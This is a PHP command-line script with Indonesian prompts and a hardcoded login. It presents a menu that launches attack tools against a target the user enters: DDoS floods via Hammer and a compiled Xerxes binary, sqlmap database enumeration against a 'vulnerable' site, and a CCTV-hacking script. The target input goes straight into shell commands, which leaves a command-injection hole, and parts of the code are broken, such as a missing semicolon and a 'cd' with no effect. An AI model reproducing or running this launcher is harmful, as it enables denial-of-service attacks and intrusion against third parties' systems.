<?php
$username = 'xios';
$password = 'veganzy';
system('clear');
echo "=== LOGIN DULU =====\n";
sleep(1); 
echo "Username : ";
$user = trim(fgets(STDIN));
echo "Password : ";
$pass = trim(fgets(STDIN));
sleep(1); 
system('clear');
if ($user == $username && $pass == $password){
echo "[+] Login Sukses\n";
sleep(2);
system('clear');
echo "=== MENU PILIHAN ====\n";
echo "1) DDOS Hammer\n";
echo "2) DDOS Xerxes\n";
echo "3) SQL MAP\n";
echo "4) HACK CCTV\n";
echo "5) Exit Program";
echo "===========\n";
sleep(1);
echo "PILIH=> ";
$menu = trim(fgets(STDIN));


if ($menu == 1){
system('clear');
echo "[+] Masukan IP Target : ";
$ip = trim(fgets(STDIN));
echo "[+] Masukan Port : ";
$port = trim(fgets(STDIN));
echo "[+] Masukan Turbo : ";
$turbo = trim(fgets(STDIN));
sleep(1);
system('clear');
echo "[!] Started [!]";
sleep(2);
system('clear');
system("python hammer.py -s '$ip' -p '$port' -t '$turbo'");
}

if ($menu == 2){
system('gcc fuck.c -o fuck');
system('clear');
echo "[+] Masukan Web Target : ( Tanpa HTTP / HTTPS )";
$target = trim(fgets(STDIN));
echo "[+] Masukan Port :";
$ipWeb = trim(fgets(STDIN));
system('clear');
system("./fuck '$target' '$ipWeb'");
}
  
if ($menu == 3){
  system('clear');
  echo "[!] Installing SQL MAP\\";
  system('git clone https://github.com/sqlmapproject/sqlmap');
  system('cd sqlmap');
  system('clear');
  echo "[+] Masukan Web vulnerable SQLi : ";
  $webTarget = trim(fgets(STDIN));
  system('clear');
  system("python2 sqlmap.py -u '$webTarget' --dbs");
}
  
 if ($menu == 4){
   system('clear');
   system('python2 CctvX.py');
 }
  
 if ($menu == 5){
   system('clear');
   echo "NO JAV NO COLI\n";
   sleep(0.2);
   echo "TITIP SALAM DARI MR.Y0UKN0WM3\n";
   sleep(0.1);
   echo "Sampai jumpa kapan2 ketemuan lagi :-}\n";
   sleep(1);
   system('clear')
   echo "[!] Exited Program..";
  }
} else {
echo "[!] Incorrect Username and Password..";
}
?>
